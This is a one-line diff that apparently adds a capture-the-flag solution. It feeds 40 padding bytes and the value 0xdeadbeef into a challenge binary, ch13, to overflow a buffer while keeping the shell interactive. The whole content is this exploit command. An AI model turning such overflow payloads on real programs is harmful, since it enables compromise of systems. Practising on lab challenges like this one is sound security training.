@@ -1,0 +1,1 @@
+cat <(python -c "print 40*'a'+'\xef\xbe\xad\xde'") -  | ./ch13
